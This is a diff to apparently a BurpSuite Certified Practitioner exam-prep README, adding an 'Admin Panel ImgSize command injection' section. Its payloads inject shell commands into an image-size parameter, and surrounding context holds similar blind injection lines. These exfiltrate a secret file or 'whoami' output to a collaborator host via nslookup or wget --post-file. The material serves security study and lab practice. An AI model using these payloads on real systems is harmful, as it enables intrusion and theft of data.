@@ -69,6 +69,7 @@ Kudos to https://github.com/botesjuan/ for this awesome image, that defines poss
 [Admin panel - Download report as PDF SSRF](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-panel---download-report-as-pdf-ssrf)  
 [Admin panel - RFI](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-panel-rfi)  
 [Admin panel - SSTI](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-panel-password-reset-email-ssti)  
+[Admin panel - ImgSize](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner/#5-admin-panel-imgsize-command-injection)  
 
 
 ## Tips
@@ -765,6 +766,13 @@ email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
 ### 4. Blind OS command injection with out-of-band data exfiltration
 ```
 email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+```
+
+### 5. Admin Panel ImgSize command injection
+```
+/admin-panel/admin_image?image=/blog/posts/50.jpg&ImageSize="200||nslookup+$(cat+/home/carlos/secret).<collaborator>%26"  
+Or  
+ImgSize="`/usr/bin/wget%20--post-file%20/home/carlos/secret%20https://collaborator/`"
 ```
 
 
